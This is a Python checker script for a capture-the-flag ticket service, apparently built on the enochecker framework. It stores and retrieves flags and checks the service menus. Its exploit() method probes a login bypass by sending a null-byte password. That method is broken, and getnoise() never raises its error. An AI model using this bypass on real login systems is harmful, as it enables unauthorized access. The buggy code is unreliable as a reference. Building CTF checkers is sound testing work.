#!/usr/bin/env python3
#socat TCP-LISTEN:7478,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./a.out"
from pwn import *
import sys
import time
from enochecker import *
import string
from random import randrange

class FlugChecker(BaseChecker):

    flag_count = 1
    noise_count = 1
    havoc_count = 1
    port = 7478


    def putflag(self):  # type: () -> None
        port = 7478
        username = self.gen_user()
        password = self.gen_password()
        try:
            print('Connecting ...')
            p = remote(self.address,port)
            #p= remote('localhost',7478)
            print("Connection succeded")
        except:
            raise EnoException("Unable to connect to the service at putflag")
        try:
            print("Reistering a user with username: {} and password {}".format(username,password))
            p.recvuntil(b"================")
            p.sendlineafter(b"================",b"2")
            p.sendlineafter(b"Please input your new username:",bytes(username,'ascii'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'ascii'))
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"1")
            p.sendlineafter(b"Please input your username:\n",bytes(username,'ascii'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'ascii'))
            p.recvuntil(b"================\n")   
            p.sendlineafter(b"================\n",b"1")
            time.sleep(.1)
            p.recvuntil(b"Enter the content of your new ticket\n")
            print("Putting in flag: {}".format(self.flag))
            p.sendline(bytes(self.flag,'ascii'))
            time.sleep(.1)
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"2")
            stdo = p.recvline()
            ticket_id = p.recvline().decode('ascii').split(" ")[1]
            print("The new flag is at index: {}".format(ticket_id))
            self.team_db[self.flag] = (username,password,ticket_id)
        except:
            raise EnoException("Put flag failed")

    def getflag(self):  # type: () -> None
        port = 7478
        try:
            print('Connecting ...')
            p = remote(self.address,port)
            #p= remote("localhost",7478)
            print("Connection succeded")
        except:
            raise EnoException("Connection failed at getflag")

        try:
            print('Retrieveng Flag ...')
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n","3")
            p.sendlineafter(b"Enter the unique id of your ticket",bytes(self.team_db[self.flag][2],'ascii'))
            p.recvline()
            p.recvline()
            flag2 = p.recvline().decode('ascii')
            print('flag retireved: {}'.format(flag2))
            print('flag should be: {}'.format(self.flag))
            if flag2.strip() != self.flag.strip():
                raise EnoException("The flags dont mach!")
        except:
            raise EnoException("Unable to put flag in the service")

    def putnoise(self):  # type: () -> None
        port = 7478
        username = self.gen_user()
        password = self.gen_password()
        try:
            print('Connecting ...')
            p = remote(self.address,port)
            #p = remote('localhost',7478)
            print("Connection succeded")
        except:
            raise EnoException("Connection failed at put noise")
        try:
            print('Puting in noise with username: {} and password: {}'.format(username,password))
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"2")
            p.sendlineafter(b"Please input your new username:\n",bytes(username,'ascii'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'ascii'))
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"1")
            p.sendlineafter(b"Please input your username:\n",bytes(username,'ascii'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'ascii'))
            p.recvuntil(b"================\n")   
            p.sendlineafter(b"================\n",b"1")
            time.sleep(.1)
            p.recvuntil(b"Enter the content of your new ticket\n")
            p.sendline(bytes(self.noise,'ascii'))
            print('puting in noise: {}'.format(self.noise))    
            time.sleep(.1)
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"2")
            stdo = p.recvline()
            noise_id = p.recvline().decode('ascii').split(' ')[1]
            print('Noise is set at id: {}'.format(noise_id))
            self.team_db[self.noise] = (username,password,noise_id)

        except:
            raise EnoException("Put noise failed")


        self.team_db["noise"] = self.noise

    def getnoise(self):  # type: () -> None
        port = 7478
        try:
            print('Connecting ...')
            p = remote(self.address,port)
            #p= remote("localhost",7478)
            print("Connection succeded")
        except:
             raise EnoException("Connection at getnoise failed")

        try:
            print("Getting noise ...")
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"3")
            p.sendlineafter(b"Enter the unique id of your ticket",bytes(self.team_db[self.noise][2],'ascii'))
            p.recvline()
            p.recvline()
            noise2 = p.recvline().decode('ascii') 
            print('Got noise: {}'.format(noise2))
            print('Expected noise: {}'.format(self.noise))                 
            if noise2.strip() != self.noise.strip():
                raise EnoException("Noises dont match")
        except:
            EnoException('Get noise failed')
        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, tht noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using flag_idx.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
    def havoc(self):  # type: () -> None
        port = 7478
        try:
            self.putnoise()
            self.getnoise()
        except:
            raise EnoException("Service mumbles")

        p = remote(self.address,port)
        #p = remote('localhost',7478)
        pass_test = True


        #we create a new ticket with current noise 
        test_ticket = self.team_db[self.noise][2]
        test_value = self.noise 

        # we login using current noise user
        test_user = self.team_db[self.noise][0]
        test_pass = self.team_db[self.noise][1]

        must_be_in_menu1 = ['menu','login','register','view ticket','exit']
        must_be_in_view_ticket_menu = ['ticket','id']
        must_be_in_menu_when_logged_in = ['buy ticket','view my tickets','view ticket','logout']

        menu1 = p.recv(200).decode('ascii').lower()
        for elem in must_be_in_menu1:
            if elem not in menu1:
                print('failed first test: \'{}\' not in menu'.format(elem))
                pass_test = False

        sleep(.2)
        p.sendline(b'3')
        menu_after_view_ticket_global = p.recv(200).decode('ascii').lower()


        for elem in must_be_in_view_ticket_menu:
            if elem not in menu_after_view_ticket_global:
                print('failed second test: \'{}\' not in menu'.format(elem))
                pass_test = False
        sleep(.2)

        p.sendline(test_ticket)

        p.sendlineafter(b"================\n",b'1')
        p.sendlineafter(b'Please input your username:\n',bytes(test_user,'ascii'))
        p.sendlineafter(b'Please input your password:\n',bytes(test_pass,'ascii'))
        logged_in_menu =p.recv(130).decode('ascii').lower()
        logged_in_menu +=p.recv(130).decode('ascii').lower()
        print('+++++++++++\nmenu: {}\n+++++++++++++'.format(logged_in_menu))
        sleep(.3)
        for elem in must_be_in_menu_when_logged_in:
            if elem not in logged_in_menu:
                print('failed last test: \'{}\' not in menu'.format(elem))
                pass_test = False

        if not pass_test:
            print('ni slo skoz')
            raise EnoException('Service mumbles')
        else:
            print('we good!')

        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """

    def exploit(self ):
        port = 7478
        #1st vuln
        p = remote(self.address,port)
        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b'1')
        p.sendlineafter(b"Please input your username:\n",bytes(username,'ascii'))
        p.sendlineafter(b"Please input your password:\n",'\x00')
        p.recvline() #TODO: odstrani ko urban popravi svoje randomly placed printfe
        p.recv(2) 
        check_line = p.recvline()
        if username in check_line:
            print("You got pwnd")
        else:
            print("Sad nox")
        pass

    def gen_user(self): 
        source = list(string.ascii_lowercase)
        username =''
        for num in range(25):
            rand_int = randrange(25)
            username += source[rand_int]
        return username

    def gen_password(self): 
        source = list(string.ascii_lowercase)
        password =''
        for num in range(25):
            rand_int = randrange(25)
            password += source[rand_int]
        return password



if __name__ == "__main__":
    run(FlugChecker)
    # Example params could be: [StoreFlag localhost ENOFLAG 1 ENOFLAG 50 1]
    # exit(ExampleChecker(port=1337).run())
